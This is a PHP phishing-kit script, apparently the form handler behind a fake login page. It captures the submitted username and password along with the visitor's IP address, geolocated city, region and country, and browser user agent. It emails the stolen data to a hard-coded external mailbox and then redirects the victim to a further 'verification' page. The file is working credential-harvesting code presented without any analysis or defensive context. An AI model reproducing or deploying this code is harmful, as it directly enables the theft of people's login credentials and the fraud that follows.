<?php 
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "---------------|DominuS|---------------\n";
$message .= "email@domain.com: " . $_POST['UserName'] . "\n"; 
$message .= "Password: " . $_POST['Password'] . "\n"; 
$message .= "IP : " .$ip. "\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------------------------------------\n";
$to = "trainsoul203@protonmail.com"; 


$hi = mail($to,$emailprovider."Others | ".$ip , $message);
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="verification.php"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 